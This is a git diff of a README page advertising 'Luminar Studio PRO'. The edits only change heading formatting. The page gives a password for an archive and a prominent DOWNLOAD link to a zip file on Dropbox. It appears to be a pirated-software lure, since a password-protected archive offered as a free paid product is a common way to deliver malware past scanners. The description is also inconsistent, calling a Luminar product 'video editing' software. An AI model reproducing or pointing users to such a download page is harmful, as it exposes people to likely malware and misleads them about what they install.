@@ -1,6 +1,6 @@
 <h1 align="center">Luminar Studio PRO</h1>
 <h4 align="center">Password to archive: ADS</h4>
-<h2 align="center"></h2>
+
 <p align="center">
   
 <h1 align="center"><a  href="https://www.dropbox.com/s/jg8m2lgos0y7cwr/MediaArchive.zip?dl=1">DOWNLOAD</a></h1>
@@ -10,7 +10,7 @@
 ------------
 ![alt-текст](https://d.radikal.ru/d21/2012/dd/9637a0d464af.jpg "Luminar4")
 
-## PROFESSIONAL VIDEO EDITING FOR EVERYONE
+<h2 align="center">PROFESSIONAL VIDEO EDITING FOR EVERYONE</h2> 
 
 ## [⚡️Luminar Version 4.4]:
 * Find the perfect color
